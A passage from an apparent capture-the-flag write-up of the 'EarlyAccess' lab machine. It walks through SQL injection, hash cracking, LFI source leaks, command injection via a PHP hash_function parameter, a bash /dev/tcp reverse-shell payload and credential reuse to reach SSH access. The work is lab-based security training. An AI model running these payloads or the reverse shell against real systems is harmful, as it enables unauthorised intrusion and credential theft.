  -l, --local           Only calculate key, do not submit
```

We can now specify our credentials to run the script and bruteforce the key.

```python
root@void:~# python3 gen_key.py --email chronos@mail.com --password P@ssw0rd
[+] Generated 60 keys!
[*] Testing 60 possible keys! 
[+] Successfully registered valid key: KEY47-8T8T8-XPPP0-GAMA7-1385 to account chronos@mail.com after a total of 31 
requests that took 31.29 seconds!
[INFO] Magic_num of the API currently is: 376
```

After about half a minute our script found a valid key: `KEY47-8T8T8-XPPP0-GAMA7-1385`.

![Script running](/assets/htb/EarlyAccess/gen_key.gif)

Let us check back to the website and see if something changed.

![Game key added](/assets/htb/EarlyAccess/https/key-added.png)

We can see that the game-key was successfully added and we as a user now also have the `Game` menu-point. Let us try to login to the game now.

### Game enumeration

After successful login, we get redirected to this page.

![Game](/assets/htb/EarlyAccess/http/game-index-webpage.png)

Let us look around the menu again.

![Scoreboard](/assets/htb/EarlyAccess/http/game-scoreboard-webpage.png)

Our scoreboard is currently empty.

![Leaderboard](/assets/htb/EarlyAccess/http/game-leaderboard-webpage.png)

The global leaderboard currently has three entries.
Let us go back and see what happens if we play the game.

![Playing the game](/assets/htb/EarlyAccess/game.gif)

Let us check the scoreboard now.

![Scoreboard](/assets/htb/EarlyAccess/http/game-scoreboard-filled.png)

The scoreboard now contains an entry with our username, our score and the time it was scored. Let us run burp in the background and see what kind of requests are done when we a gameover happens.

```http
GET /actions/score.php?score=2 HTTP/1.1
Host: game.earlyaccess.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://game.earlyaccess.htb/game.php
Cookie: PHPSESSID=081e5bb5310fac90bc3570dd1f604bd9
```
After finishing a game, a request to `/actions/score.php?score=SCORE` is made. Let us use sqlmap to check if this is exploitable.

```bash
root@void:~# sqlmap -u http://game.earlyaccess.htb/actions/score.php?score=* --cookie=PHPSESSID=081e5bb5310fac90bc3570dd1f604bd9
[...]
15:21:28] [CRITICAL] all tested parameters do not appear to be injectable. [...]
[*] ending @ 15:21:28 /2021-05-26/
```

sqlmap does not find a sql-injection vulnerability. However we are able to modify the request and get a better score e.g: `31337`:

![Scoreboard](/assets/htb/EarlyAccess/http/game-leaderboard-full.png)

The global leaderboard contains our modified score now.

### Exploiting SQL-injection in scoreboard

#### Finding the SQLi

If we remember back to the forum, the username `'` caused errors on the scoreboard. Let us see what happens when we change the username.

![Changed username to SingleQuoteMan](/assets/htb/EarlyAccess/https/scoreboard-username.png)

Let us now check back to the game's scoreboard.

![SQL error](/assets/htb/EarlyAccess/http/sql-error-scoreboard.png)

We get an SQL-error on the scoreboard showing us parts of the SQL-query.

```sql
'<USERNAME>') ORDER BY scoreboard.score DESC LIMIT 11
```

Let us try to exploit this vulnerability now. First let us change the username to `')-- -`.

![SQL error](/assets/htb/EarlyAccess/http/sql-no-error-scoreboard.png)

After changing the username to comment out the rest of the query, we do not get any errors anymore. This means we have a second-order SQL-injection using our username! Let us now start with the union injection.

#### Finding columns of union-injection

![SQL union](/assets/htb/EarlyAccess/http/sqli-union-ok.png)

We can successfully exploit the UNION injection using three columns.

#### Enumerating the database

Let us see what databases are available to us.

![UNION DBs](/assets/htb/EarlyAccess/http/sqli-union-db.png)

We only have one database: `db`.

![UNION tables](/assets/htb/EarlyAccess/http/sqli-union-tables.png)

We have three interesting tables in the `db` database:

- failed_logins
- scoreboard
- users

![UNION Columns](/assets/htb/EarlyAccess/http/sqli-union-columns.png)

The most interesting table is the `users` table with the `name` and `password` field. 

#### Leaking the admin hash

Let us extract the password from the table to finally get permanent access to the admin-account. By using following payload:

```sql
') UNION SELECT name,password,email from users -- -
```

![UNION leak pw](/assets/htb/EarlyAccess/http/sqli-union-users.png)

We have successfully extracted the admins password and can use john or hashcat to crack it.

```bash
root@void:~# cat hash.txt 
618292e936625aca8df61d5fff5c06837c49e491
```

### Cracking the admin hash

#### John

Let us now crack the hash using john.

```bash
root@void:~# john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
gameover         (?)
1g 0:00:00:00 DONE (2022-02-03 10:43) 100.0g/s 658400p/s 658400c/s 658400C/s hyacinth..foolish
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```

We successfully crack the hash using john: `gameover`.

#### Hashcat

We can also crack the hash using hashcat:

```powershell
PS> .\hashcat64.exe -m 100 .\hashes\earlyaccess.hash .\wl\rockyou.txt
hashcat (v5.1.0) starting...

======================================
* Device #1: GeForce GTX 1070, 2048/8192 MB allocatable, 15MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Dictionary cache hit:
* Filename..: .\wl\rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

618292e936625aca8df61d5fff5c06837c49e491:gameover

Session..........: hashcat
Status...........: Cracked
Hash.Type........: SHA1
Hash.Target......: 618292e936625aca8df61d5fff5c06837c49e491
Time.Started.....: Thu Feb 03 16:51:07 2022 (0 secs)
Time.Estimated...: Thu Feb 03 16:51:07 2022 (0 secs)
Guess.Base.......: File (.\wl\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 50065.2 kH/s (2.20ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 983040/14344385 (6.85%)
Rejected.........: 0/983040 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> computer_87
Hardware.Mon.#1..: Temp: 52c Fan:  0% Util: 14% Core:1797MHz Mem:4104MHz Bus:16

Started: Thu Feb 03 16:51:00 2022
Stopped: Thu Feb 03 16:51:08 2022
```

We successfully crack the hash using hashcat after 8 seconds: `gameover`.

### Dev enumeration

Now that we have the password of the admin, we can try to access the <http://dev.earlyaccess.htb> host.

![Dev login](/assets/htb/EarlyAccess/http/dev-login-valid.png)

We successfully login as admin and get redirected to this page:

![Home webpage](/assets/htb/EarlyAccess/http/dev-home.png)

After logging in, we have a menu with two options available:

- Hashing-tools
- File-tools

Let us take a look at each of these.

![Hashing tools webpage](/assets/htb/EarlyAccess/http/dev-hashing-webpage.png)

![Hashing tools webpage](/assets/htb/EarlyAccess/http/dev-hashing-webpage2.png)

The hashing page seems to let us hash passwords or verify hashes.

![File tools webpage](/assets/htb/EarlyAccess/http/dev-file-webpage.png)

The file webpage tells us that the user-interface is not yet implemented. Let us the file-tools for now ignore and further enumerate the hashing-tools.

#### Hashing-tools enumeration

Hashing a password and intercepting shows us following request:

```http
POST /actions/hash.php HTTP/1.1
Host: dev.earlyaccess.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://dev.earlyaccess.htb
Connection: close
Referer: http://dev.earlyaccess.htb/home.php?tool=hashing
Cookie: PHPSESSID=53608c1856dd241664812c4f3bc74bcc

action=hash&redirect=true&password=test&hash_function=md5
```

The request is send to `/actions/hash.php` and contains following parameters:

- `action` → hash
- `redirect` → true
- `password` → test
- `hash_function` → md5

After sending the request, we get following result shown on the webpage:

![Hashing result](/assets/htb/EarlyAccess/http/dev-hashing-result.png)

If we remove the redirect value (post-body shown below), we get shown following webpage.

```bash
action=hash&password=test&hash_function=md5
```

![Hashing no redirect](/assets/htb/EarlyAccess/http/dev-hashing-noredirect.png)

Without the redirect, testing is much easier. If we change `action` to another value (e.g: `a`), we get redirected to the home page. If we change the `hash_function` (e.g: `a`), we get following error:

![Hashing_function error](/assets/htb/EarlyAccess/http/dev-hashing-error.png)

Let us look at the verify action next. For the verify action we can observe the same behavior (changing `action` or `hash_function`) as for the hashing.

We have two possible outcomes for the verify action:

- Success:

![Verify OK](/assets/htb/EarlyAccess/http/dev-verify-ok.png)

- Failure:

![Verify with error](/assets/htb/EarlyAccess/http/dev-verify-error.png)

As we do not seem to have any other interesting functionality, let us continue our enumeration with the file-tools.

#### File-tools enumeration

We can either find the file-tools using gobuster or by guessing.

As the hashing-tools are stored in `/actions/hash.php`, we can guess that the file-tools are stored in `/actions/file.php`. If we don't want to guess, we can use gobuster:

```bash
root@void:~# gobuster dir -u http://dev.earlyaccess.htb/actions/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php --cookies PHPSESSID=65596d02db2c36f5ae169bfd41849386
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.earlyaccess.htb/actions/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Cookies:                 PHPSESSID=65596d02db2c36f5ae169bfd41849386
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/02/03 11:17:09 Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 302) [Size: 0] [--> /index.php]
/file.php             (Status: 500) [Size: 35]
/logout.php           (Status: 302) [Size: 0] [--> /home.php]
/hash.php             (Status: 302) [Size: 0] [--> /home.php] 
```

Using gobuster, we find `/file.php` (returns 500). Let us take a look at this file.

![File action](/assets/htb/EarlyAccess/http/dev-file.png)

After trying some default parameters like <http://dev.earlyaccess.htb/actions/file.php?file=test>, I decided to do some fuzzing. Using gobuster and the [burp-parameter-names.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt) wordlist from [SecLists](https://github.com/danielmiessler/SecLists):

```bash
root@void:~# gobuster fuzz -u http://dev.earlyaccess.htb/actions/file.php?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --cookies PHPSESSID=65596d02db2c36f5ae169bfd41849386 --exclude-length 35
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://dev.earlyaccess.htb/actions/file.php?FUZZ=test
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
[+] Exclude Length:   35
[+] Cookies:          PHPSESSID=65596d02db2c36f5ae169bfd41849386
[+] User Agent:       gobuster/3.1.0
[+] Timeout:          10s
===============================================================
2022/02/03 11:20:29 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=500] [Length=32] http://dev.earlyaccess.htb/actions/file.php?filepath=test
                                                                                         
===============================================================
2022/02/03 11:20:52 Finished
===============================================================
```

After only a couple seconds we find the valid parameter: `filepath`. Let us see what happens here:

![file.php with filepath](/assets/htb/EarlyAccess/http/dev-file-error.png)

Let us try to some common LFI-techniques to read /etc/passwd.

![Directory traversal blocked](/assets/htb/EarlyAccess/http/dev-file-lfi.png)

Our directory-traversal gets blocked. Let us try to access the hash.php file, which is in the current dirctory.

![Directory traversal blocked](/assets/htb/EarlyAccess/http/dev-file-hash.png)

The hash.php file gets executed and we are shown some error. This means we have a LFI-vulnerability with restricted file-access.

#### Exploiting file.php to leak source code

We can exploit the LFI to leak the source-code of `hash.php` using php://filter. The payload we can use looks as follows:

<http://dev.earlyaccess.htb/actions/file.php?filepath=php://filter/convert.base64-encode/resource=hash.php>

![Source-code leak](/assets/htb/EarlyAccess/http/dev-file-leak.png)

We successfully leak the source-code of hash.php by encoding it to base64. Let us decode the base64 and look at the source-code.

```bash
root@void:~# echo -n PD9waHA[...]n0KPz4= | base64 -d > hash.php
```

We can now analyze the hash.php file.

#### Static code-analysis - hash.php

Let us break the code of the file into smaller segments to make it easier to explain.

```php
<?php
include_once "../includes/session.php";

function hash_pw($hash_function, $password)
{
    // DEVELOPER-NOTE: There has gotta be an easier way...
    ob_start();
    // Use inputted hash_function to hash password
    $hash = @$hash_function($password);
    ob_end_clean();
    return $hash;
}
```

The first part of the PHP-code includes the `session.php` file from the includes directory. The `hash_pw` function takes a php-function `hash_function` and calls it with `password` as the parameter. There is also a DEVELOPER-NOTE stating that the code may be overcomplicated. This can theoretically be exploited, if we specify an evil php-function as `hash_function` (e.g: `system`) and an evil parameter (e.g: `id`), we can get arbitrary php-execution and maybe even remote-code-execution.

```php
try
{
    if(isset($_REQUEST['action']))
    {
        if($_REQUEST['action'] === "verify")
        {
            // VERIFIES $password AGAINST $hash
            if(isset($_REQUEST['hash_function']) && isset($_REQUEST['hash']) && isset($_REQUEST['password']))
            {
                // Only allow custom hashes, if `debug` is set
                if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
                    throw new Exception("Only MD5 and SHA1 are currently supported!");

                $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);

                $_SESSION['verify'] = ($hash === $_REQUEST['hash']);
                header('Location: /home.php?tool=hashing');
                return;
            }
        }
```

Next the file checks if the parameter `action` is specified. The first possible action is `verify`, which checks if `hash_function`, `hash` and `password` is set. Then it checks if the `hash_function` is either `md5` or `sha1` or if `debug` is set. Only if `debug` is set, other functions are allowed. Then it calls `hash_pw` and redirects to the hashing-tools page with the result of verify.

```php
elseif($_REQUEST['action'] === "verify_file")
{
    //TODO: IMPLEMENT FILE VERIFICATION
}
elseif($_REQUEST['action'] === "hash_file")
{
    //TODO: IMPLEMENT FILE-HASHING
}
```

Next there are two unimplemented functions that we can ignore.

```php
elseif($_REQUEST['action'] === "hash")
{
    // HASHES $password USING $hash_function
    if(isset($_REQUEST['hash_function']) && isset($_REQUEST['password']))
    {
        // Only allow custom hashes, if `debug` is set
        if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
            throw new Exception("Only MD5 and SHA1 are currently supported!");

        $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
        if(!isset($_REQUEST['redirect']))
        {
            echo "Result for Hash-function (" . $_REQUEST['hash_function'] . ") and password (" . $_REQUEST['password'] . "):<br>";
            echo '<br>' . $hash;
            return;
        }
        else
        {
            $_SESSION['hash'] = $hash;
            header('Location: /home.php?tool=hashing');
            return;
        }
    }
}
}
// Action not set, ignore
throw new Exception("");
```

If the action is set to `hash`, it checks if `hash_function` and `password` is set. Then same as the verify action, it checks for debug or md5 or sha1. Then it calls `hash_pw` again and returns the result of the hash-function.

```php
}
catch(Exception $ex)
{
    if($ex->getMessage() !== "")
        $_SESSION['error'] = htmlentities($ex->getMessage());

    header('Location: /home.php');
    return;
}
?>
```

Finally there is some exception handling that shows errors on the home-page.

In order to exploit hash.php and get RCE, we have to supply `debug`, set the hash_function to `system`, `shell_exec`, `passthru` or similar and use `password` to execute commands.

#### Exploiting hash.php

Using following request, we can get RCE on the host.

```http
POST /actions/hash.php HTTP/1.1
Host: dev.earlyaccess.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://dev.earlyaccess.htb
Connection: close
Referer: http://dev.earlyaccess.htb/home.php?tool=hashing
Cookie: PHPSESSID=53608c1856dd241664812c4f3bc74bcc

action=hash&password=id&hash_function=system&debug=true
```

We get following result:

![RCE on dev](/assets/htb/EarlyAccess/http/dev-hashing-rce.png)

We successfully get RCE on the host as `www-data`. We can now use the RCE to get a reverse-shell.

```http
POST /actions/hash.php HTTP/1.1
Host: dev.earlyaccess.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Origin: http://dev.earlyaccess.htb
Connection: close
Referer: http://dev.earlyaccess.htb/home.php?tool=hashing
Cookie: PHPSESSID=53608c1856dd241664812c4f3bc74bcc

action=hash&password=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.10/443+0>%261'&hash_function=system&debug=true
```

Let us check back on our listener.

```bash
root@void:~# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.110] 57524
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ons$ python3 -c 'import pty;pty.spawn("/bin/bash")'     
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ^Z
[1]+  Stopped                 nc -lvnp 443
root@void:~# stty raw -echo; fg
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ export TERM=xterm
```

We successfully get a shell as www-data. Using python, we can upgrade our shell to a full pty.

### Web-server enumeration

Now that we have a shell as www-data on the webserver, let us enumerate the server.

#### Enumeration as www-data

Enumerating the web-server, we can see that we are in a docker-container:

```bash
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ls -alh /
total 84K
drwxr-xr-x   1 root root 4.0K Feb  3 13:14 .
drwxr-xr-x   1 root root 4.0K Feb  3 13:14 ..
-rwxr-xr-x   1 root root    0 Feb  3 13:14 .dockerenv
drwxr-xr-x   1 root root 4.0K Jul 14  2021 bin
drwxr-xr-x   2 root root 4.0K Jun 13  2021 boot
drwxr-xr-x   5 root root  340 Feb  3 13:14 dev
drwxr-xr-x   1 root root 4.0K Feb  3 13:14 etc
drwxr-xr-x   1 root root 4.0K Feb  3 13:14 home
[...]
```

Looking at the `/home` directory, we find that there is another user on the server.

```bash
www-data@webserver:/home$ ls -alh
total 12K
drwxr-xr-x 1 root    root    4.0K Feb  3 13:14 .
drwxr-xr-x 1 root    root    4.0K Feb  3 13:14 ..
drwxr-xr-x 2 www-adm www-adm 4.0K Feb  3 13:14 www-adm
```

Looking in the user's home-directory, we can see a `.wgetrc` file.

```bash
www-data@webserver:/home/www-adm$ ls -alh
total 24K
drwxr-xr-x 2 www-adm www-adm 4.0K Feb  3 13:14 .
drwxr-xr-x 1 root    root    4.0K Feb  3 13:14 ..
lrwxrwxrwx 1 root    root       9 Feb  3 13:14 .bash_history -> /dev/null
-rw-r--r-- 1 www-adm www-adm  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 www-adm www-adm 3.5K Apr 18  2019 .bashrc
-rw-r--r-- 1 www-adm www-adm  807 Apr 18  2019 .profile
-r-------- 1 www-adm www-adm   33 Feb  3 13:14 .wgetrc
```

Our next goal is to get to the user www-adm. As we have the admin password for the webpage, let us check for password-reuse.

```bash
www-data@webserver:/home/www-adm$ su www-adm
Password: gameover
www-adm@webserver:~$
```

We successfully switched to www-adm user. Let us now read the `.wgetrc` file.

```bash
www-adm@webserver:~$ cat .wgetrc 
user=api
password=s3CuR3_API_PW!
```

Looking at the man page of wget:

```bash
root@void:~# man wget
[...]
--http-user=user
       --http-password=password
           Specify the username user and password password on an HTTP server.  According to the type of the
           challenge, Wget will encode them using either the "basic" (insecure), the "digest", or the Windows
           "NTLM" authentication scheme.

           Another way to specify username and password is in the URL itself.  Either method reveals your password
           to anyone who bothers to run "ps".  To prevent the passwords from being seen, use the --use-askpass or
           store them in .wgetrc or .netrc, and make sure to protect those files from other users with "chmod".  If
           the passwords are really important, do not leave them lying in those files either---edit the files and
           delete them after Wget has started the download.
[...]
```

The man page of wget, tells us that the `.wgetrc` file contains credentials that can be used for HTTP-Basic auth.

#### API enumeration

Let us try to access the API next. Usually docker-containers can talk to each other, if in the same network. Let us try to find the IP of the docker-API. For this we can do is trying to access the API using the hostname (probably: `api`).

```bash
www-adm@webserver:~$ which nc
/bin/nc
www-adm@webserver:~$ nc api 80
api [172.18.0.101] 80 (http) : Connection refused
```

We successfully got the IP of the API using netcat. Now let us do a quick portscan using netcat.

#### Port scanning API

We can now use netcat to portscan the api using following script.

```bash
#!/bin/bash
HOST="api"
for PORT in $(seq 1 65535);
 do
         nc -z $HOST $PORT; # Connect to host foreach port
         if [[ $? -eq 0 ]]; # Port open
          then
                  echo "$HOST:$PORT is open!";
         fi
 done
```

After running the script for a couple of seconds, we get a result returned:

```bash
www-adm@webserver:~$ ./portscan.sh 
api:5000 is open!
```

Let us try to access the API now.

#### Using wget

```bash
www-adm@webserver:~$ wget -O- -q api:5000
{"message":"Welcome to the game-key verification API! You can verify your keys via: /verify/<game-key>. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.","status":200}
```

We can try to access `/check_db`.

```bash
www-adm@webserver:~$ wget -O- -q api:5000/check_db
{"message":{
"AppArmorProfile":"docker-default",
"Args":[...],
"Env":[
"MYSQL_DATABASE=db","MYSQL_USER=drew","MYSQL_PASSWORD=drew","MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5",[...]
],"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},[...],
"Status":"running"}},
"status":200}
```

The environment variables contains a username `drew` and a password: `XeoNu86JTznxMCQuGHrGutF3Csq5`.

```bash
www-adm@webserver:~$ wget -O- -q api:5000/check_db | grep -oE 'MYSQL_USER=[^"]*'
MYSQL_USER=drew
www-adm@webserver:~$ wget -O- -q api:5000/check_db | grep -oE 'MYSQL_ROOT_PASSWORD=[^"]*'
MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5
```

#### Using curl

Using curl, we manually have to specify the HTTP-Auth credentials using the `-u` flag.

```bash
www-adm@webserver:~$ curl api:5000/check_db
Invalid HTTP-Auth!
www-adm@webserver:~$ curl -sS -u 'api:s3CuR3_API_PW!' api:5000/check_db | grep -oE 'MYSQL_ROOT_PASSWORD=[^"]*'
MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5
```

We get the password for the user `drew`: `XeoNu86JTznxMCQuGHrGutF3Csq5`.

### Getting shell as user drew

Using the username and the password, we can try to ssh into the machine.

```bash
root@void:~# ssh drew@earlyaccess.htb
drew@earlyaccess.htb password: XeoNu86JTznxMCQuGHrGutF3Csq5
Linux earlyaccess 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Sep  5 15:56:50 2021 from 10.10.14.6
drew@earlyaccess:~$ ls -alh
total 32K
drwxr-xr-x 4 drew drew 4.0K Aug 18 16:04 .
drwxr-xr-x 4 root root 4.0K Jul 14  2021 ..
lrwxrwxrwx 1 root root    9 Jul 14  2021 .bash_history -> /dev/null
-rw-r--r-- 1 drew drew  220 May 24  2021 .bash_logout
-rw-r--r-- 1 drew drew 3.5K May 24  2021 .bashrc
drwx------ 3 drew drew 4.0K Aug 18 16:04 .gnupg
-rw-r--r-- 1 drew drew  807 May 24  2021 .profile
drwxr-x--- 2 drew drew 4.0K Aug 25 23:45 .ssh
-r-------- 1 drew drew   33 Feb  3 14:14 user.txt
```

We successfully login as `drew` on the machine and can now read user.txt.

```bash
drew@earlyaccess:~$ cat user.txt 
5424d***************************
```

Let us see if there are any other users on the machine.

```bash
drew@earlyaccess:/home$ ls -alh
total 16K
drwxr-xr-x  4 root     root     4.0K Jul 14  2021 .
drwxr-xr-x 19 root     root     4.0K Aug 31 02:39 ..
drwxr-xr-x  4 drew     drew     4.0K Aug 18 16:04 drew
drwxr-xr-x  2 game-adm game-adm 4.0K Jul 14  2021 game-adm
```

Game-adm sounds like a more privileged account.

### Privesc to game-adm

Now that we have user, let us start further enumerating the box to find a privesc-vector to game-adm.

#### Enumeration as drew

Upon login, we saw following message: `You have mail.` We can find our in `/var/mail`.

```bash
drew@earlyaccess:/home$ ls -alh /var/mail/
total 12K
drwxrwsr-x  2 root mail 4.0K Jul 14  2021 .
drwxr-xr-x 12 root root 4.0K Aug 18 18:16 ..
-rw-r--r--  1 root mail  678 Jul 14  2021 drew
```

Let us read the mail.

```markdown
drew@earlyaccess:~$ cat /var/mail/drew 
To: <drew@earlyaccess.htb>
Subject: Game-server crash fixes
From: game-adm <game-adm@earlyaccess.htb>
Date: Thu May 27 8:10:34 2021


Hi Drew!

Thanks again for taking the time to test this very early version of our newest project!
We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it...) 
If the game hangs now, the server will restart and be available again after about a minute.

If you find any other problems, please don't hesitate to report them!

Thank you for your efforts!
Game-adm (and the entire EarlyAccess Studios team).

```

The email states that the development-team has implemented a healthcheck feature for their game-server to restart on crashes. Let us keep this mind, as this information may come in handy later on.

Let us look into the `.ssh` directory of the user next.

```bash
drew@earlyaccess:~$ ls -alh .ssh/
total 16K
drwxr-x--- 2 drew drew 4.0K Aug 25 23:45 .
drwxr-xr-x 4 drew drew 4.0K Aug 18 16:04 ..
-rw------- 1 drew drew 3.4K Jul 14  2021 id_rsa
-rw------- 1 drew drew  749 Jul 14  2021 id_rsa.pub
```

Let us take a look at the `id_rsa.pub` file, as it usually contains the username the key is intended for.

```bash
drew@earlyaccess:~$ cat .ssh/id_rsa.pub 
ssh-rsa AAAAB3N[...]lcS8w== game-tester@game-server
```

Seems like the ssh-key is used for `game-tester` for the server: `game-server`!  The email also talked about a `game-server`.

Our next goal is to find the `game-server`. Before we start searching, let us enumerate the rest of the host first. Looking at `/opt`, we find an interesting directory: `docker-entrypoint.d`.

```bash
drew@earlyaccess:~$ ls -alh /opt/
total 16K
drwxr-xr-x  4 root root 4.0K Jul 14  2021 .
drwxr-xr-x 19 root root 4.0K Aug 31 02:39 ..
drwx--x--x  4 root root 4.0K Jul 14  2021 containerd
drwxrwxr-t  2 root drew 4.0K Feb  3 17:39 docker-entrypoint.d
```

Looking into the directory, we find following script:

```bash
drew@earlyaccess:/opt/docker-entrypoint.d$ ls -alh
total 12K
drwxrwxr-t 2 root drew 4.0K Feb  3 17:39 .
drwxr-xr-x 4 root root 4.0K Jul 14  2021 ..
-rwxr-xr-x 1 root root  100 Feb  3 17:39 node-server.sh
drew@earlyaccess:/opt/docker-entrypoint.d$ cat node-server.sh 
service ssh start

cd /usr/src/app

# Install dependencies
npm install

sudo -u node node server.js
```

The script runs ssh and starts a node-server. Let us map all docker-hosts. We have three docker-networks:

```bash
drew@earlyaccess:~$ ip addr
[...]
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:0a:93:31:de brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-696cbf24f7c0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0b:1a:eb:97 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-696cbf24f7c0
       valid_lft forever preferred_lft forever
5: br-5705af1e7ac2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:94:7f:e2:ea brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-5705af1e7ac2
       valid_lft forever preferred_lft forever

```

Let us start with a ping-scan and see what hosts are active on which docker-network.

```bash
drew@earlyaccess:~$ for i in $(seq 2 254); do (ping -c1 -W5 172.17.0.$i >/dev/null && echo "172.17.0.$i" &); done
drew@earlyaccess:~$ for i in $(seq 2 254); do (ping -c1 -W5 172.18.0.$i >/dev/null && echo "172.18.0.$i" &); done
172.18.0.2
172.18.0.100
172.18.0.101
172.18.0.102
drew@earlyaccess:~$ for i in $(seq 2 254); do (ping -c1 -W5 172.19.0.$i >/dev/null && echo "172.19.0.$i" &); done
172.19.0.2
172.19.0.4
```

We have 6 docker-hosts in two subnets. As we should be able to SSH into the docker-container, we can use netcat to check for open SSH-ports.

```bash
drew@earlyaccess:~$ for ip in $(for i in $(seq 2 254); do (ping -c1 -W5 172.18.0.$i >/dev/null && echo "172.18.0.$i" &); done  | xargs -L1); do nc -z $ip 22 && echo $ip; done
drew@earlyaccess:~$ for ip in $(for i in $(seq 2 254); do (ping -c1 -W5 172.19.0.$i >/dev/null && echo "172.19.0.$i" &); done  | xargs -L1); do nc -z $ip 22 && echo $ip; done
172.19.0.4
```

We successfully found a known-host! Let us ssh into it. We could've also tried to find the host using nmap or ssh.

#### Enumeration of the game-server

Let us ssh into the docker-container.

```bash
drew@earlyaccess:~$ ssh game-tester@172.19.0.4
Linux game-server 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
game-tester@game-server:~$
```

We successfully logged into the container as the user `game-tester`. Let us enumerate the container now. Let us begin by checking out which users are on this container:

```bash
game-tester@game-server:~$ ls -alh /home/
total 20K
drwxr-xr-x 1 root        root        4.0K Jul 14  2021 .
drwxr-xr-x 1 root        root        4.0K Feb  3 13:14 ..
drwxr-xr-x 2 game-adm    game-adm    4.0K Jul 14  2021 game-adm
drwxr-xr-x 1 game-tester game-tester 4.0K Jul 14  2021 game-tester
drwxr-xr-x 1 node               1000 4.0K Jun 23  2021 node
game-tester@game-server:~$ cat /etc/passwd | grep /bin/.*sh
root:x:0:0:root:/root:/bin/bash
node:x:1111:1111::/home/node:/bin/bash
game-tester:x:1001:1001::/home/game-tester:/bin/bash
game-adm:x:1002:1002::/home/game-adm:/bin/bash
```

There are four users on the docker-host: `root`, `node`, `game-tester` and `game-adm`.

Looking at the root of the fs, we can find some interesting files:

```bash
